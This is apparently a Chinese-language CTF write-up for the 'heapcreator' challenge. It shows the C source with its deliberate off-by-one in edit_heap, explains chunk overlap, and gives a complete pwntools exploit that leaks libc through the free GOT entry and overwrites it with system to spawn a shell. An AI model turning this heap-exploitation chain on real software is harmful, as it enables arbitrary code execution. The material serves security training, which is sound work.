---
layout: post
title: heapcreator heap off by one
excerpt: "heap off by one"
categories: [Writeup]
comments: true
---
首先查看下代码

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void read_input(char *buf,size_t size){		//从屏幕中读取size个数到buf中
	int ret ;
    ret = read(0,buf,size);
    if(ret <=0){
        puts("Error");
        _exit(-1);
    }	
}

struct heap {
	size_t size ;
	char *content ;
};

struct heap *heaparray[10];

void menu(){									// 就是一个介绍,不用看
	puts("--------------------------------");
	puts("          Heap Creator          ");
	puts("--------------------------------");
	puts(" 1. Create a Heap               ");
	puts(" 2. Edit a Heap                 ");
	puts(" 3. Show a Heap                 ");
	puts(" 4. Delete a Heap               ");
	puts(" 5. Exit                        ");
	puts("--------------------------------");
	printf("Your choice :");
}

void create_heap(){
	int i ;
	char buf[8];
	size_t size = 0;
	for(i = 0 ; i < 10 ; i++){
		if(!heaparray[i]){				//遍历查找没有使用的进行malloc
			heaparray[i] = (struct heap *)malloc(sizeof(struct heap));
			if(!heaparray[i]){
				puts("Allocate Error");
				exit(1);
			}
			printf("Size of Heap : ");
			read(0,buf,8);
			size = atoi(buf);		//根据输入申请长度
			heaparray[i]->content = (char *)malloc(size);
			if(!heaparray[i]->content){
				puts("Allocate Error");
				exit(2);
			}
			heaparray[i]->size = size ;
			printf("Content of heap:");			//将长度放到content中
			read_input(heaparray[i]->content,size);
			puts("SuccessFul");
			break ;
		}
	}
}

void edit_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){
		printf("Content of heap : ");
		read_input(heaparray[idx]->content,heaparray[idx]->size+1);	//为什么这里有一个size+1?? 明显的off by one
		puts("Done !");
	}else{
		puts("No such heap !");
	}
}

void show_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){			// 根据输入的index,进行遍历
		printf("Size : %ld\nContent : %s\n",heaparray[idx]->size,heaparray[idx]->content);
		puts("Done !");
	}else{
		puts("No such heap !");
	}

}

void delete_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){						// 根据输入的index进行free,并置零
		free(heaparray[idx]->content);
		free(heaparray[idx]);
		heaparray[idx] = NULL ;
		puts("Done !");	
	}else{
		puts("No such heap !");
	}

}


int main(){
	char buf[4];
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	while(1){
		menu();
		read(0,buf,4);
		switch(atoi(buf)){			//循环中进行选择
			case 1 :
				create_heap();
				break ;
			case 2 :
				edit_heap();
				break ;
			case 3 :
				show_heap();
				break ;
			case 4 :
				delete_heap();
				break ;
			case 5 :
				exit(0);
				break ;
			default :
				puts("Invalid Choice");
				break;
		}

	}
	return 0 ;
}
```
这里有一个heap的 off by one ,我们可以进行如下利用

- 利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。
- 申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。

最终的exp如下

```
#coding=utf-8
from pwn import *
sh=process('./heapcreator')
elf=ELF('./heapcreator')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(size,value):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Size of Heap :')
    sh.sendline(str(size))
    sh.recvuntil('Content of heap:')
    sh.sendline(value)

def edit(idx,value):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))
    sh.recvuntil('Content of heap : ')
    sh.sendline(value)

def show(idx):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))

def delete(idx):
    sh.recvuntil('Your choice :')
    sh.sendline('4')
    sh.recvuntil('Index :')
    sh.sendline(str(idx))

free_got=elf.got['free']
create(0x18,'aaaaaaa')  		#idx0 实际分配了0x10的chunk，重用idx1的prev_size的8个字节
create(0x10,'aaaaaaa')			#idx1
create(0x10,'aaaaaaa')			#idx2
create(0x10,'/bin/sh\x00')		#idx3
payload='a'*0x18+'\x81'
edit(0,payload)  				#修改idx1的size为0x81 
delete(1)						#idx1进入0x70的unsorted bin
size='\x08'.ljust(8,'\x00')
payload='b'*0x40+size+p64(free_got)
create(0x70,payload)	#分配到idx1 此时size为0x70，可以堆溢出到idx2，修改idx2的内容指针为free_got
show(2)	#输出free真实地址,泄露libc基地址
sh.recvuntil('Content :')
free_adr=u64(sh.recvline()[:-1].strip().ljust(8,'\x00'))
#free_adr=u64(sh.recvuntil('\nDone')[:-5].ljust(8,'\x00'))
print 'free_adr: '+hex(free_adr)
libc_base=free_adr-libc.symbols['free']
system_adr=libc_base+libc.symbols['system']
print 'libc_base: '+hex(libc_base)
print 'system_adr: '+hex(system_adr)
edit(2,p64(system_adr)) #将free_got改为system地址
delete(3)#free(idx->content)触发
sh.interactive()
``
